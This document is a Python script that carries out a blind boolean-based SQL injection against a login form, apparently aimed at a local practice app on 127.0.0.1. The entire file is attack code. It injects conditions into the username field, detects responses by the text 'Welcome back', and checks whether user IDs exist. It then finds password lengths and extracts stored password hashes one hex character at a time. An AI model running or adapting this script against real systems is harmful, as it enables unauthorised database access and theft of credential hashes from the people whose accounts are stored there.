import requests

total_queries = 0
charset = "0123456789abcdef"
target = "http://127.0.0.1:5000"
needle = "Welcome back"

def injected_query(payload):
    global total_queries
    r = requests.post(
        target, 
        data = {"username" : "admin' and {}".format(payload), "password" : "password"}
    )
    total_queries += 1
    return needle.encode() not in r.content

def boolean_query(offset, user_id, character, operator=">"):
    print(f"offset: {offset}, user_id: {user_id}, operator: {operator}")
    payload = f"(select hex(substr(password, {offset +1}, 1)) from user where id= {user_id}) {operator} hex('{character}')"
    return injected_query(payload)

def invalid_user(user_id):
    payload = f"(select id from user where id = {user_id}) >= 0"
    return injected_query(payload)

def password_length(user_id):
    i = 0
    while True:
        payload = f"(select length(password) from user where id = {user_id} and length(password) <= {i} limit 1)"
        if not injected_query(payload):
            return i
        i += 1

def extract_hash(charset, user_id, password_length):
    found = ""
    for i in range(0, password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found

while True:
    try:
        user_id = input("> Enter a user ID to extract the password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print(f"\t[-] User {user_id} hash length: {user_password_length}")
            print(f"\t[-] User {user_id} hash: {extract_hash(charset, int(user_id), user_password_length)}")
        else:
            print(f"\t [X] User {user_id} does not exist.")
    except KeyboardInterrupt:
        break



        